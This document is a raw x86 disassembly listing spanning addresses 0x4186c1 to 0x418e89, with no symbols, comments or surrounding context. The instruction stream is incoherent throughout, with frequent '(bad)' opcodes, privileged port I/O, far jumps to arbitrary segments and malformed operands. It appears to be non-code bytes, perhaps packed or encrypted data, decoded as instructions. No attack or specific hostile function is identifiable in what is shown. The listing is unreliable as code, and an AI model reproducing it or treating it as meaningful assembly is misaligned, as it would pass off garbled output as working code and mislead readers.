  4186c1:	jnp    0x418732
  4186c3:	or     BYTE PTR [edi-0x38312603],dl
  4186c9:	push   ds
  4186ca:	stos   BYTE PTR es:[edi],al
  4186cb:	fbld   TBYTE PTR [edx+0x3d]
  4186ce:	or     edi,DWORD PTR [ebp-0x53c8fc48]
  4186d4:	jmp    0xa3d7913c
  4186d9:	mov    esp,ecx
  4186db:	and    al,0x0
  4186dd:	jge    0x41874d
  4186df:	(bad)  
  4186e0:	movd   mm5,DWORD PTR [edx]
  4186e3:	jbe    0x4186d3
  4186e5:	and    bl,BYTE PTR [ecx]
  4186e7:	dec    edx
  4186e8:	sbb    DWORD PTR [ebp-0x4cee82bc],edx
  4186ee:	mov    dh,BYTE PTR [eax]
  4186f0:	push   0x3bb7d1c4
  4186f5:	add    cl,BYTE PTR [ebx+0x52]
  4186f8:	pop    ecx
  4186f9:	adc    al,0x77
  4186fb:	(bad)  
  4186fc:	xor    al,0xb7
  4186fe:	xor    eax,DWORD PTR [edi]
  418700:	mov    dl,0x9
  418702:	sti    
  418703:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418704:	in     eax,dx
  418705:	ror    BYTE PTR [ebp-0x7dffb312],cl
  41870b:	xchg   DWORD PTR [ebx],edx
  41870d:	xchg   esp,eax
  41870e:	(bad)  
  41870f:	das    
  418710:	(bad)  
  418711:	pop    ecx
  418712:	fcomip st,st(7)
  418714:	push   ebx
  418715:	push   ebp
  418716:	lds    ebx,FWORD PTR [eax+0x25]
  418719:	ror    DWORD PTR [ebx+0x11],0x2c
  41871d:	ret    
  41871e:	pop    esp
  41871f:	xchg   ebx,eax
  418720:	popw   ss
  418722:	mov    ebx,0x7a8ee909
  418727:	jae    0x418712
  418729:	aam    0x19
  41872b:	push   es
  41872c:	in     al,0xc0
  41872e:	in     eax,0xfd
  418730:	inc    ebp
  418731:	jmp    0x41875a
  418733:	icebp  
  418734:	loope  0x4187a8
  418736:	scas   eax,DWORD PTR es:[edi]
  418737:	retf   0x8255
  41873a:	mov    ebp,0xf3a82633
  41873f:	out    dx,al
  418740:	jmp    0x418747
  418742:	add    BYTE PTR [edx-0x5dda67e8],dl
  418748:	rol    bh,cl
  41874a:	mov    al,ds:0x84af4f9
  41874f:	add    bh,0x1c
  418752:	pop    ss
  418753:	ds int3 
  418755:	cmp    eax,ebx
  418757:	pop    edx
  418758:	mov    ah,0xff
  41875a:	xchg   esi,eax
  41875b:	cwde   
  41875c:	jb     0x418797
  41875e:	sbb    eax,DWORD PTR [ecx+0x3c14a878]
  418764:	popf   
  418765:	pop    eax
  418766:	sub    ah,BYTE PTR ds:0x9032d8fe
  41876c:	ins    DWORD PTR es:[edi],dx
  41876d:	icebp  
  41876e:	push   ebx
  41876f:	cmc    
  418770:	fisttp WORD PTR [bx+di+0x1805]
  418775:	in     al,dx
  418776:	jecxz  0x418709
  418778:	xor    edx,ecx
  41877a:	jle    0x41871f
  41877c:	jmp    0x65517cd3
  418781:	push   ecx
  418782:	mov    eax,edi
  418784:	sbb    al,0x57
  418786:	stos   DWORD PTR es:[edi],eax
  418787:	jo     0x418747
  418789:	push   edi
  41878a:	retf   
  41878b:	and    ebx,DWORD PTR [edi+0x2e01174]
  418791:	scas   eax,DWORD PTR es:[edi]
  418792:	xchg   edi,eax
  418793:	int3   
  418794:	and    dh,BYTE PTR [ebx]
  418796:	inc    edx
  418797:	cmc    
  418798:	mov    ecx,0xcf7c79e3
  41879d:	repnz xor bl,BYTE PTR [esi+0x60]
  4187a1:	cmp    eax,0xc490fede
  4187a6:	mov    cl,0x56
  4187a8:	add    eax,0xbe5ae606
  4187ad:	pop    eax
  4187ae:	shr    BYTE PTR [esi+0x6468a62c],1
  4187b4:	inc    ecx
  4187b5:	es mov eax,0x6887ecc3
  4187bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187bc:	test   BYTE PTR [edi+0x44],0x1e
  4187c0:	out    0x3a,eax
  4187c2:	scas   eax,DWORD PTR es:[edi]
  4187c3:	aam    0xd0
  4187c5:	scas   eax,DWORD PTR es:[edi]
  4187c6:	je     0x4187a5
  4187c8:	stc    
  4187c9:	adc    eax,0xaef596ad
  4187ce:	mov    ds:0x87d1aa93,al
  4187d3:	mov    ecx,edx
  4187d5:	cmp    edx,ebp
  4187d7:	dec    ebx
  4187d8:	in     al,0x24
  4187da:	jmp    0xc601:0x5ee54e33
  4187e1:	mov    edi,0x6d80f275
  4187e6:	inc    eax
  4187e7:	mov    ds:0x8d8a10a8,eax
  4187ec:	add    bh,BYTE PTR [ebx-0x6a]
  4187ef:	adc    edi,DWORD PTR [esi-0x10833b0b]
  4187f5:	dec    ebp
  4187f6:	bound  edx,QWORD PTR [esi]
  4187f8:	and    eax,0x4550c851
  4187fd:	adc    al,ah
  4187ff:	push   ecx
  418800:	sub    DWORD PTR [ebp+0x61ab3ae0],edx
  418806:	pop    ebx
  418807:	sub    al,0x15
  418809:	fwait
  41880a:	shl    BYTE PTR [edi-0x7fd885b1],cl
  418810:	sbb    ah,dl
  418812:	push   ds
  418813:	mov    BYTE PTR [edi+0x2639a3e8],al
  418819:	icebp  
  41881a:	aad    0xc7
  41881c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41881d:	or     ebp,edx
  41881f:	ins    BYTE PTR es:[edi],dx
  418820:	mov    ecx,0x87d9741e
  418825:	fiadd  WORD PTR [esi-0x5b]
  418828:	adc    ch,0x8
  41882b:	mov    bl,BYTE PTR [ebx+0x4b]
  41882e:	push   ds
  41882f:	les    ebp,FWORD PTR es:[esi+ebx*8]
  418833:	(bad)  
  418834:	aaa    
  418835:	cmp    edi,DWORD PTR [edi-0x1ce3ddfe]
  41883b:	push   esp
  41883c:	jl     0x4187ff
  41883e:	mov    edi,0x2afa53d8
  418843:	pop    ss
  418844:	mov    ebp,0xa84804bb
  418849:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41884a:	mov    al,ds:0xe5b98c8a
  41884f:	adc    al,0xf9
  418851:	lea    edi,[edi+0x71674d8c]
  418857:	or     eax,0x42cb3bd
  41885c:	xchg   bh,al
  41885e:	lock int3 
  418860:	shl    DWORD PTR [eax+0x33904684],cl
  418866:	mov    esp,0x57d3b757
  41886b:	ds lahf 
  41886d:	push   edx
  41886e:	xor    DWORD PTR [ecx+0x49c371bc],esi
  418874:	sub    al,BYTE PTR [esi+0xb64b3c1]
  41887a:	ins    BYTE PTR es:[edi],dx
  41887b:	jne    0x4188ca
  41887d:	pop    ebx
  41887e:	sbb    ebp,ecx
  418880:	das    
  418881:	add    BYTE PTR [ebx],cl
  418883:	mov    esp,0x3f57eb48
  418888:	mov    al,ds:0xbec383b6
  41888d:	gs pop ecx
  41888f:	mov    DWORD PTR [ebx-0x66e47f74],ecx
  418895:	jns    0x41886b
  418897:	pop    ss
  418898:	jle    0x418872
  41889a:	jge    0x4188aa
  41889c:	shl    BYTE PTR [ebp+0x37],0x64
  4188a0:	add    edx,DWORD PTR [ecx]
  4188a2:	mov    WORD PTR [edx+eiz*2+0x53],gs
  4188a6:	in     al,dx
  4188a7:	mov    cs,WORD PTR cs:[ecx]
  4188aa:	loope  0x4188e4
  4188ac:	aaa    
  4188ad:	sub    BYTE PTR [esi+0x15149cb8],al
  4188b3:	mov    al,0xe1
  4188b5:	jge    0x4188b7
  4188b7:	shl    DWORD PTR ds:0x20d94f9d,1
  4188bd:	mov    cl,0x59
  4188bf:	jmp    0x5342:0xb5bfa50
  4188c6:	jnp    0x4188ba
  4188c8:	(bad)  
  4188c9:	fimul  WORD PTR [ecx+0x24]
  4188cc:	sub    ecx,DWORD PTR [edx+0x2c]
  4188cf:	mov    ah,0xa2
  4188d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188d2:	(bad)  
  4188d3:	not    ebx
  4188d5:	pop    edx
  4188d6:	or     BYTE PTR [eax],ch
  4188d8:	inc    edi
  4188d9:	or     BYTE PTR [ebp+esi*1+0x72adf309],0x3d
  4188e1:	sar    DWORD PTR [ebx],cl
  4188e3:	push   edi
  4188e4:	inc    ebp
  4188e5:	popa   
  4188e6:	sbb    DWORD PTR [ecx-0x31],ecx
  4188e9:	loop   0x418917
  4188eb:	stos   BYTE PTR es:[edi],al
  4188ec:	rcr    BYTE PTR [ecx-0x22918640],1
  4188f2:	jmp    0xf7b8:0x3ffed3ca
  4188f9:	test   al,0x14
  4188fb:	pop    ss
  4188fc:	push   esi
  4188fd:	adc    ecx,DWORD PTR [eax+0x4d]
  418900:	imul   edi,DWORD PTR [eax+0x1afa1263],0xcf450b6c
  41890a:	push   cs
  41890b:	fwait
  41890c:	jmp    FWORD PTR [ecx+0xd]
  41890f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418910:	xor    DWORD PTR [ebx],esp
  418912:	ins    BYTE PTR es:[edi],dx
  418913:	sub    edx,DWORD PTR [eax-0x3d7caa46]
  418919:	ins    BYTE PTR es:[edi],dx
  41891a:	(bad)  
  41891b:	call   0x68eb968d
  418920:	imul   edi,DWORD PTR [ebx+0x51],0x7bddcd4d
  418927:	mov    ebx,0xa1ddca91
  41892c:	or     bh,BYTE PTR [edi+0x1e70180]
  418932:	std    
  418933:	cmp    ch,BYTE PTR [eax-0x4f8bc399]
  418939:	add    bh,BYTE PTR [ebx*8-0x2359f3d6]
  418940:	fnstenv [esi]
  418942:	stos   BYTE PTR es:[edi],al
  418943:	mov    eax,ds:0xb6ad04f8
  418948:	sub    BYTE PTR [ebx-0x6c7e9243],bl
  41894e:	mov    al,0x69
  418950:	xor    DWORD PTR [edi+0x1b8d3fb1],esi
  418956:	inc    edx
  418957:	xchg   DWORD PTR [edi+0x6a],ebp
  41895a:	js     0x41897f
  41895c:	xchg   ebp,eax
  41895d:	jg     0x41890f
  41895f:	nop
  418960:	push   ebp
  418961:	xchg   dl,al
  418963:	cmp    bl,BYTE PTR [edi+ebx*1]
  418966:	jp     0x4189ad
  418968:	or     BYTE PTR [ebx+0x14],ah
  41896b:	sbb    eax,0x7d0b09c9
  418970:	les    esp,FWORD PTR [ebx+0x69]
  418973:	pop    edx
  418974:	test   eax,0x6dcf4c6b
  418979:	jns    0x418905
  41897b:	cdq    
  41897c:	pop    es
  41897d:	gs seto cl
  418981:	mov    BYTE PTR [ebp-0x564ec4fd],bl
  418987:	mov    ds,WORD PTR [eax+0x8822ab3]
  41898d:	out    0xb6,al
  41898f:	jmp    0x418939
  418991:	stos   DWORD PTR es:[edi],eax
  418992:	or     dh,dh
  418994:	loop   0x4189a5
  418996:	and    al,0x0
  418998:	fsubr  DWORD PTR [eax-0x7dfe9f1e]
  41899e:	pop    edi
  41899f:	repz pop esi
  4189a1:	and    bl,ah
  4189a3:	xlat   BYTE PTR ds:[ebx]
  4189a4:	pop    esi
  4189a5:	loopne 0x418a0c
  4189a7:	jne    0x41893c
  4189a9:	or     BYTE PTR [bp+si-0x63],ah
  4189ad:	pop    ebx
  4189ae:	dec    ebx
  4189af:	pop    ebp
  4189b0:	jnp    0x4189aa
  4189b2:	dec    eax
  4189b3:	xchg   edi,eax
  4189b4:	leave  
  4189b5:	mov    dl,0x98
  4189b7:	dec    eax
  4189b8:	fxtract 
  4189ba:	in     eax,dx
  4189bb:	pop    edx
  4189bc:	in     al,0x89
  4189be:	add    bl,BYTE PTR [ecx+0x74a5bec0]
  4189c4:	push   ebx
  4189c5:	test   al,0x27
  4189c7:	les    edx,FWORD PTR [esi-0x6224b0d6]
  4189cd:	cmp    cl,cl
  4189cf:	fs pop ebp
  4189d1:	std    
  4189d2:	inc    esi
  4189d3:	js     0x418a11
  4189d5:	in     eax,dx
  4189d6:	cld    
  4189d7:	and    BYTE PTR [ebp+0x20],bh
  4189da:	add    ah,BYTE PTR [edx+0x7d]
  4189dd:	call   0xb344812f
  4189e2:	pop    ecx
  4189e3:	test   DWORD PTR [edi+ebx*2+0x3c],esp
  4189e7:	cmc    
  4189e8:	jne    0x418a50
  4189ea:	arpl   si,cx
  4189ec:	jo     0x418a3c
  4189ee:	sbb    al,0xe4
  4189f0:	add    al,0x9c
  4189f2:	ret    0x48b4
  4189f5:	lock push 0xc9f65f5b
  4189fb:	push   esi
  4189fc:	rcl    BYTE PTR [esi+ecx*2],0x3f
  418a00:	and    cl,0x61
  418a03:	add    DWORD PTR [ecx-0x16512e52],edi
  418a09:	outs   dx,DWORD PTR ds:[esi]
  418a0a:	jb     0x4189b6
  418a0c:	dec    esi
  418a0d:	sbb    edx,DWORD PTR [ecx]
  418a0f:	bound  eax,QWORD PTR [edx-0x6403ed7b]
  418a15:	add    al,0xa2
  418a17:	stos   BYTE PTR es:[edi],al
  418a18:	loopne 0x418a98
  418a1a:	mov    edx,0x527dcb27
  418a1f:	xchg   edi,eax
  418a20:	out    0x8b,al
  418a22:	or     edx,DWORD PTR ds:0xbb0bfd5e
  418a28:	jnp    0x418a58
  418a2a:	adc    al,al
  418a2c:	sub    DWORD PTR [ecx+0x7f4f605c],edi
  418a32:	pushf  
  418a33:	add    ebx,DWORD PTR [esi]
  418a35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a36:	out    dx,al
  418a37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a38:	out    0x8d,eax
  418a3a:	or     BYTE PTR [ebx-0x1e],al
  418a3d:	mov    dh,0xab
  418a3f:	mov    al,ds:0xfa73c807
  418a44:	and    BYTE PTR [edi+0x5ce3e6da],dh
  418a4a:	cmp    BYTE PTR [eax],ch
  418a4c:	out    dx,al
  418a4d:	cli    
  418a4e:	and    edx,ebp
  418a50:	push   eax
  418a51:	lods   eax,DWORD PTR ds:[esi]
  418a52:	push   esp
  418a53:	and    al,0xa8
  418a55:	mov    eax,DWORD PTR [ecx-0x15]
  418a58:	jl     0x418a4e
  418a5a:	mov    esi,0x777f09f6
  418a5f:	arpl   WORD PTR [edi+0x3b4594b9],si
  418a65:	test   al,0xbb
  418a67:	jmp    esp
  418a69:	ja     0x418a3e
  418a6b:	cmp    bl,BYTE PTR cs:[eax-0x3fd00edd]
  418a72:	and    eax,0xd928de0e
  418a77:	mov    ecx,0x71e94d22
  418a7c:	imul   ebp,DWORD PTR [esi-0x73],0x4d
  418a80:	mov    dh,0x48
  418a82:	cmp    eax,0xec64bb42
  418a87:	push   esp
  418a88:	mov    ecx,ebx
  418a8a:	jae    0x418a44
  418a8c:	cmp    ebp,DWORD PTR [eax+0x3b919287]
  418a92:	lock inc esi
  418a94:	ds jg  0x418ad6
  418a97:	xor    DWORD PTR [ebx+0x4c],ebp
  418a9a:	xor    al,cl
  418a9c:	(bad)  
  418a9d:	call   DWORD PTR [eax-0x5f]
  418aa0:	sbb    ecx,0x9c924e6a
  418aa6:	(bad)  
  418aa7:	cs pushf 
  418aa9:	add    DWORD PTR [esi+esi*2],ebx
  418aac:	(bad)  
  418aad:	mov    ds:0xcff203ed,eax
  418ab2:	dec    BYTE PTR [edi-0x4bb73549]
  418ab8:	dec    esp
  418ab9:	add    eax,0x87c7f404
  418abe:	frstor [edi-0x2c1e242a]
  418ac4:	test   DWORD PTR [edi],esi
  418ac6:	loopne 0x418a75
  418ac8:	popa   
  418ac9:	fsub   st(3),st
  418acb:	adc    bl,cl
  418acd:	nop
  418ace:	cmp    dh,dh
  418ad0:	add    al,BYTE PTR [edx]
  418ad2:	lock mov ebx,DWORD PTR [ecx-0x6e]
  418ad6:	add    eax,0x68c6026d
  418adb:	call   0x2a18:0xc9724640
  418ae2:	adc    DWORD PTR [ecx-0x3f8bf522],0xffffffc3
  418ae9:	push   ss
  418aea:	or     al,0xe5
  418aec:	jmp    0xcfb8:0x84a4e318
  418af3:	scas   eax,DWORD PTR es:[edi]
  418af4:	xchg   edi,eax
  418af5:	fild   QWORD PTR [esi-0x20]
  418af8:	sub    DWORD PTR [ebp-0x1c],eax
  418afb:	fmul   st(7),st
  418afd:	outs   dx,BYTE PTR es:[esi]
  418aff:	arpl   WORD PTR [esi],cx
  418b01:	test   edi,0xbfcf4939
  418b07:	jl     0x418b7f
  418b09:	pop    ss
  418b0a:	cmp    al,0x65
  418b0c:	cmp    al,0x23
  418b0e:	leave  
  418b0f:	push   ds
  418b10:	pop    edi
  418b11:	xchg   esi,eax
  418b12:	stos   DWORD PTR es:[edi],eax
  418b13:	int    0xb2
  418b15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b16:	push   ebp
  418b17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b18:	sbb    DWORD PTR [ebx-0x4cca2d31],esi
  418b1e:	fistp  QWORD PTR [edx+ecx*4]
  418b21:	adc    al,0x1
  418b23:	daa    
  418b24:	idiv   ch
  418b26:	push   ss
  418b27:	xchg   esi,eax
  418b28:	jo     0x418b87
  418b2a:	and    dl,BYTE PTR [ebp+0x46]
  418b2d:	sub    al,BYTE PTR [edi-0x6f]
  418b30:	xor    edx,DWORD PTR [ebp+0xca012e1]
  418b36:	inc    ebp
  418b37:	adc    al,0xcf
  418b39:	outs   dx,BYTE PTR ds:[esi]
  418b3a:	pop    ebx
  418b3b:	pop    ebx
  418b3c:	xlat   BYTE PTR ds:[ebx]
  418b3d:	sub    al,0xd
  418b3f:	or     esp,ebp
  418b41:	mov    bh,0x37
  418b43:	and    al,0x5f
  418b45:	xor    DWORD PTR [edx+ebp*4+0x76522021],ebp
  418b4c:	sub    DWORD PTR [eax*8-0x7bbc5060],eax
  418b53:	das    
  418b54:	sbb    bl,BYTE PTR [eax]
  418b56:	outs   dx,BYTE PTR ds:[si]
  418b58:	inc    edx
  418b59:	jp     0x418b94
  418b5b:	cmp    BYTE PTR es:[ebp-0x111165a9],al
  418b62:	mov    ?,WORD PTR [ebx]
  418b64:	xchg   ecx,eax
  418b65:	inc    ebp
  418b66:	mov    WORD PTR ss:0x3e70b5b2,?
  418b6d:	dec    ebp
  418b6e:	dec    esi
  418b6f:	cld    
  418b70:	clc    
  418b71:	jae    0x418be2
  418b73:	jmp    0x7d7a6aa5
  418b78:	test   DWORD PTR [edx-0x58],ebp
  418b7b:	js     0x418b67
  418b7d:	icebp  
  418b7e:	xor    bh,BYTE PTR [ecx]
  418b80:	test   eax,0x56a575b2
  418b85:	aaa    
  418b86:	cmp    BYTE PTR [eax],cl
  418b88:	(bad)  
  418b89:	int    0x56
  418b8b:	xchg   BYTE PTR ds:0x262112c4,al
  418b91:	or     eax,0xca7b8ac1
  418b96:	les    edi,FWORD PTR [eax+edi*2-0x76e69de8]
  418b9d:	push   ss
  418b9e:	sbb    al,0x92
  418ba0:	adc    eax,0xc5cb0a1b
  418ba5:	aaa    
  418ba6:	adc    ebx,DWORD PTR [edi-0x6b]
  418ba9:	nop
  418baa:	out    0xb0,al
  418bac:	jno    0x418ba3
  418bae:	mov    ds:0x96178dfd,eax
  418bb3:	pop    ebp
  418bb4:	test   DWORD PTR [edx-0x46fb5fc0],esp
  418bba:	dec    ecx
  418bbb:	in     al,dx
  418bbc:	fidivr DWORD PTR [esi+0x351c0f45]
  418bc2:	dec    eax
  418bc3:	push   ds
  418bc4:	add    al,0xae
  418bc6:	enter  0x2e7a,0xa7
  418bca:	adc    eax,edx
  418bcc:	in     eax,0x8a
  418bce:	shr    BYTE PTR [ecx-0x55],cl
  418bd1:	out    0x8e,eax
  418bd3:	cdq    
  418bd4:	imul   ecx,DWORD PTR [ebp-0x7292ae64],0xfffffff8
  418bdb:	xchg   DWORD PTR [ebx-0x4234949c],esp
  418be1:	mov    cl,0x62
  418be3:	ret    0x2b86
  418be6:	mov    esi,0x2bb6b567
  418beb:	push   cx
  418bed:	sbb    DWORD PTR [ebp-0x56],ebx
  418bf0:	sub    DWORD PTR [ebp+ecx*8-0x7d72fd40],eax
  418bf7:	xchg   edx,eax
  418bf8:	aam    0xeb
  418bfa:	nop
  418bfb:	inc    esi
  418bfc:	xor    al,ch
  418bfe:	hlt    
  418bff:	adc    dl,BYTE PTR ds:0x47130262
  418c05:	pop    eax
  418c06:	call   0xac48faa1
  418c0b:	scas   eax,DWORD PTR es:[edi]
  418c0c:	pushf  
  418c0d:	outs   dx,DWORD PTR ds:[esi]
  418c0e:	sub    DWORD PTR cs:[ebx-0x5d42e383],0x311f9800
  418c19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c1a:	aad    0x9b
  418c1c:	cmp    esp,eax
  418c1e:	addr16 push edx
  418c20:	imul   edx,DWORD PTR [ecx+esi*1+0x5ded73c6],0xffffffbb
  418c28:	pushf  
  418c29:	mov    bh,BYTE PTR [ecx]
  418c2b:	mov    eax,0x220df3f4
  418c30:	cdq    
  418c31:	push   ebp
  418c32:	inc    ebx
  418c33:	cwde   
  418c34:	ret    0x365b
  418c37:	stc    
  418c38:	jge    0x418cb0
  418c3a:	(bad)  
  418c3b:	call   0xa67344cf
  418c40:	sub    DWORD PTR [eax],eax
  418c42:	mov    edx,0x693dd262
  418c47:	and    al,dl
  418c49:	pop    ds
  418c4a:	mov    edi,0x89b352f3
  418c4f:	shr    BYTE PTR [edx-0x34],0xee
  418c53:	push   ecx
  418c54:	dec    ebp
  418c55:	xor    eax,0x36952405
  418c5a:	aam    0x54
  418c5c:	outs   dx,DWORD PTR ds:[esi]
  418c5d:	clc    
  418c5e:	sbb    al,0xc3
  418c60:	cmp    DWORD PTR [edx+0x3f9fec41],edx
  418c66:	std    
  418c67:	call   0x12e9c518
  418c6c:	push   esp
  418c6d:	adc    DWORD PTR [ebx+0x6dfd6511],esp
  418c73:	inc    edi
  418c74:	jbe    0x418cbe
  418c76:	inc    esp
  418c77:	out    dx,eax
  418c78:	mov    dl,0xa1
  418c7a:	dec    ecx
  418c7b:	sbb    al,0xe5
  418c7d:	mov    bh,0x53
  418c7f:	or     al,bl
  418c81:	mov    al,0xde
  418c83:	mov    eax,0x97ce2e2
  418c88:	fdivp  st(7),st
  418c8a:	cld    
  418c8b:	cmp    bh,bl
  418c8d:	cli    
  418c8e:	push   ecx
  418c8f:	push   ss
  418c90:	push   ebx
  418c91:	push   eax
  418c92:	cmp    DWORD PTR [ebx+0xf],0x14525125
  418c99:	ficomp WORD PTR [esi]
  418c9b:	aas    
  418c9c:	pop    esp
  418c9d:	leave  
  418c9e:	loopne 0x418d1e
  418ca0:	das    
  418ca1:	icebp  
  418ca2:	pcmpeqw mm3,QWORD PTR [eax]
  418ca5:	sbb    ah,al
  418ca7:	dec    esi
  418ca8:	sbb    al,0xde
  418caa:	mov    ch,0x84
  418cac:	test   eax,0xb725194f
  418cb1:	popf   
  418cb2:	enter  0xa640,0xb
  418cb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cb7:	(bad)  [ecx-0x78e887d8]
  418cbd:	mov    dh,0xd4
  418cbf:	outs   dx,DWORD PTR ds:[esi]
  418cc0:	sbb    eax,0xb058c391
  418cc5:	adc    eax,0x20558f16
  418cca:	mov    esi,0x8cd2f3e1
  418ccf:	outs   dx,BYTE PTR ds:[esi]
  418cd0:	out    0xaf,eax
  418cd2:	gs stc 
  418cd4:	xlat   BYTE PTR ds:[ebx]
  418cd5:	ret    
  418cd6:	jp     0x418c65
  418cd8:	xor    al,0x90
  418cda:	jmp    0x6bde:0xe9129428
  418ce1:	jg     0x418c81
  418ce3:	aam    0xb1
  418ce5:	nop
  418ce6:	arpl   WORD PTR [edi+eiz*1-0x5f],di
  418cea:	je     0x418cc2
  418cec:	inc    eax
  418ced:	hlt    
  418cee:	fbstp  TBYTE PTR [ebx+edi*4-0x26]
  418cf2:	iret   
  418cf3:	push   ebp
  418cf4:	pop    eax
  418cf5:	ror    ch,1
  418cf7:	js     0x418d71
  418cf9:	out    0xd0,eax
  418cfb:	or     eax,0xaa14fc02
  418d00:	mov    ebx,0x31361460
  418d05:	push   ecx
  418d06:	mov    ch,0x8d
  418d08:	inc    esp
  418d09:	inc    eax
  418d0a:	shl    DWORD PTR [edi],0xff
  418d0d:	push   ds
  418d0e:	lds    edx,FWORD PTR [edx]
  418d10:	xor    esp,DWORD PTR [eax]
  418d12:	push   esp
  418d13:	lds    ecx,FWORD PTR [eax]
  418d15:	out    dx,al
  418d16:	xor    eax,0xe907143a
  418d1b:	icebp  
  418d1c:	les    esp,FWORD PTR [edi+0x171db00b]
  418d22:	cmp    ch,BYTE PTR [edx-0x72b512a9]
  418d28:	adc    al,0x2a
  418d2a:	pop    edx
  418d2b:	jp     0x418cdc
  418d2d:	fs mov edx,ebp
  418d30:	(bad)  
  418d31:	inc    edi
  418d32:	bound  ebp,QWORD PTR [edi+0x5d]
  418d35:	mov    esp,0xe858adf8
  418d3a:	ins    DWORD PTR es:[edi],dx
  418d3b:	neg    ebx
  418d3d:	or     esp,DWORD PTR [ebp-0xc]
  418d40:	mov    ds:0xa8ff68e7,eax
  418d45:	sar    dl,1
  418d47:	sub    DWORD PTR gs:[edx],0x3f7dcf3
  418d4e:	hlt    
  418d4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d50:	mov    dh,0x1
  418d52:	out    dx,eax
  418d53:	and    eax,0x8b92243
  418d58:	ja     0x418d5a
  418d5a:	add    DWORD PTR [ebp+0x5f],ecx
  418d5d:	jbe    0x418d2a
  418d5f:	mov    ch,0x5d
  418d61:	ret    0xc6a2
  418d64:	es or  eax,0xbe35c11c
  418d6a:	rol    al,1
  418d6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d6d:	das    
  418d6e:	jno    0x418d0e
  418d70:	push   edx
  418d71:	es loop 0x418d5a
  418d74:	sahf   
  418d75:	add    eax,0x290d63be
  418d7a:	or     al,0x58
  418d7c:	nop
  418d7d:	mov    ah,0x42
  418d7f:	in     al,dx
  418d80:	dec    ebp
  418d81:	mov    bh,0x99
  418d83:	push   0x8ffcf329
  418d88:	mov    eax,0x50dc6e0c
  418d8d:	in     al,0xfd
  418d8f:	dec    ecx
  418d90:	sar    edi,cl
  418d92:	mov    dl,0x21
  418d94:	mov    dl,0x71
  418d96:	ja     0x418dd3
  418d98:	pop    ss
  418d99:	adc    al,0x4e
  418d9b:	jmp    0xf989:0xa72a6cd1
  418da2:	add    ebx,edx
  418da4:	stos   BYTE PTR es:[edi],al
  418da5:	aas    
  418da6:	mov    ebx,0x7f6360c7
  418dab:	xchg   DWORD PTR [ebx-0x7d],ebx
  418dae:	xor    DWORD PTR [ebp-0x8],ecx
  418db1:	dec    esi
  418db2:	rcl    edi,1
  418db4:	popf   
  418db5:	mov    eax,0x20498ecf
  418dba:	cmp    ah,al
  418dbc:	(bad)
  418dbf:	fnsave [edx]
  418dc1:	leave  
  418dc2:	addr16 pop es
  418dc4:	adc    ebx,0xf974c036
  418dca:	adc    bh,BYTE PTR [esi]
  418dcc:	gs adc eax,0xf206d2c8
  418dd2:	cmp    DWORD PTR [ecx],esi
  418dd4:	sub    BYTE PTR [eax],bl
  418dd6:	pop    esp
  418dd7:	je     0x418e2b
  418dd9:	mov    dl,cl
  418ddb:	sbb    ebx,edx
  418ddd:	daa    
  418dde:	sbb    ah,BYTE PTR [esi]
  418de0:	std    
  418de1:	mov    dl,0xf9
  418de3:	sub    ebx,DWORD PTR [edx]
  418de5:	cld    
  418de6:	das    
  418de7:	js     0x418dae
  418de9:	ja     0x418dc9
  418deb:	xor    esi,edi
  418ded:	in     al,0xc5
  418def:	out    dx,eax
  418df0:	aaa    
  418df1:	add    DWORD PTR [esi-0x7dd0ab29],0x29
  418df8:	test   eax,0x80474489
  418dfd:	mov    al,0x1f
  418dff:	fcomp  QWORD PTR [eax]
  418e01:	xchg   ebx,eax
  418e02:	add    BYTE PTR [eax-0x3c],ch
  418e05:	mov    edi,0xad088179
  418e0a:	jl     0x418e2f
  418e0c:	fcom   DWORD PTR [ecx]
  418e0e:	stos   BYTE PTR es:[edi],al
  418e0f:	(bad)  
  418e10:	lods   al,BYTE PTR ds:[esi]
  418e11:	pop    ss
  418e12:	aad    0x45
  418e14:	inc    ecx
  418e15:	sbb    esp,esp
  418e17:	inc    esi
  418e18:	in     eax,dx
  418e19:	pusha  
  418e1a:	lea    ecx,[ebx-0x79b9fe5a]
  418e20:	add    cl,dl
  418e22:	out    dx,eax
  418e23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e24:	int3   
  418e25:	data16 xchg BYTE PTR [edx+eax*4-0x51cc844d],dl
  418e2d:	je     0x418e73
  418e2f:	imul   eax,edx,0xab7ed72
  418e35:	adc    bh,dh
  418e37:	jbe    0x418e92
  418e39:	pop    edi
  418e3a:	rol    DWORD PTR [esi-0x24],cl
  418e3d:	scas   al,BYTE PTR es:[edi]
  418e3e:	inc    DWORD PTR [eax+0x5ed70f]
  418e44:	push   eax
  418e45:	push   0xffffffe2
  418e47:	out    dx,al
  418e48:	fs in  al,0xe0
  418e4b:	rol    BYTE PTR [esi],0xcc
  418e4e:	sbb    DWORD PTR fs:[eax+0x2a],0x2d
  418e53:	mov    al,0x99
  418e55:	std    
  418e56:	adc    DWORD PTR ds:0xae0b773f,eax
  418e5c:	inc    ecx
  418e5d:	scas   al,BYTE PTR es:[edi]
  418e5e:	loopne 0x418e45
  418e60:	mov    WORD PTR [ecx+ebx*1-0xa],fs
  418e64:	adc    DWORD PTR [ecx],ebx
  418e66:	mov    dl,0xbd
  418e68:	(bad)  
  418e69:	test   eax,0xe48e42f5
  418e6e:	(bad)  
  418e6f:	mov    dh,0xf3
  418e71:	adc    al,dl
  418e73:	mov    BYTE PTR [eax+0x101cd3c9],bl
  418e79:	cmc    
  418e7a:	imul   ecx,DWORD PTR [esi+esi*4],0xffffffbc
  418e7e:	mov    edi,0x22081e2
  418e83:	mov    bl,BYTE PTR [ebp+0x50e7aa1a]
  418e89:	push   ecx
